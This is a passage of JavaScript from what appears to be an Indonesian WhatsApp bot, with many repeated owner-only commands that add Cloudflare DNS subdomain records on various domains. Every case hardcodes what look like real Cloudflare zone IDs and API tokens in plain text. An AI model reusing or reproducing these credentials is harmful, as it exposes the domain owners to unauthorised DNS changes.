           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain27': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "144f7c48ca035135390fe5adb49d642f";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "rullz.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain28': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4fc8192dd8160307100b207d308da80c";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "rullzpedia.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain29': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain30': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain31': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "754b80a855a0be5f8408362be027de47";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelanimeku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain32': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "1b8b2821eb3d60238f77040a58145716";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "rafatharcode.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain33': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "68dd02e5c33e8a87a774b29a53477c65";
               let apitoken = "deeOf4cDFxeWbmiMZGEUgavbM_MrJiFK_YfYObvy";
               let tld = "petrahosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain34': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg";
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain35': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4fea9743b5d3cda39c1ca4723f7d340";
               let apitoken = "s6OJ5bBy5fuQeNV6FsokuS3PrMK6QWFt-BstAm3y";
               let tld = "aryaelsa.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain36': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "d9fed4af6f28dc2561a7156aa12fb84a";
             let apitoken = "5WsnGm0bow95QnGzCpy-eEd_Xr2u5MFp3YtUkz_2";
             let tld = "zanss.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain37': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "b77309fe2616e152f80cab1a4e5a9b46";
             let apitoken = "5zL3j880znmlh3Avpm8lIkrfhdU-khI6njLmJsKH";
             let tld = "focal.us.kg";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain38': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "786726d74f4726c32e9c455c967378fe";
 let apitoken = "X5rdtkuaI4NHPMGTdBJs9i_iBTCBJ-iupZRFrokE";
 let tld = "lanamel.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain39': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "6dabab81c4010b8d5ca2c1ad6533f4e5";
 let apitoken = "NPo5khhbfEoWi1MYMaUKPB70hKDCcHwC9StQDUTZ";
 let tld = "loydzstoree.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain40': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "80d954f9b8c1532a23de972135694380";
 let apitoken = "FReDAgWJ5-xJYF-y79fMFpQF2_YwBHR4vZ8wpOlV";
 let tld = "panell-lan.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain41': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
             let zone = "0b431e23b22d9e0c627f5a5dc7119cd6";
 let apitoken = "Gqgc-6lAKjwq3QPnT80vL0v8Nhkt35dIXJIODv2u";
 let tld = "waysdev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break       
case 'delsubdo' : {
 if (!isOwner) return onlyOwn()

